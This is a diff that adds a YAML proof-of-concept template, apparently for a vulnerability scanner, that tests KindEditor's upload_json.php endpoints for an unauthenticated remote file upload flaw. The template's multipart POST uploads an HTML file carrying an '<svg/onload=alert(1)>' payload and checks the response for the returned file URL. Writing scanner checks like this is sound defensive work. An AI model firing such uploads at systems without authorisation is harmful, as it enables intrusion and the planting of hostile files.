@@ -1,0 +1,33 @@
+id: poc-yaml-kindeditor-remote-file-upload
+info:
+  name: KindEditor 远程文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: KindEditor
+  osprey-id: vb_2019_0008
+variables:
+  r_path: '/php/upload_json.php?dir=file
+
+    /kindeditor/php/upload_json.php?dir=file
+
+    /editor/php/upload_json.php?dir=file'
+requests:
+- method: POST
+  path: '{{.r_path}}'
+  headers:
+    Content-Type: multipart/form-data; boundary=------------------------daab1327fd8a25d1
+  data: '--------------------------daab1327fd8a25d1
+
+    Content-Disposition: form-data; name="imgFile"; filename="test.html"
+
+    Content-Type: text/html
+
+
+    <svg/onload=alert(1)>
+
+    --------------------------daab1327fd8a25d1--'
+  expression: 'contains(body, "attached") && contains(body, "{\"error\":0,\"url\":")
+
+    '
+transport: http
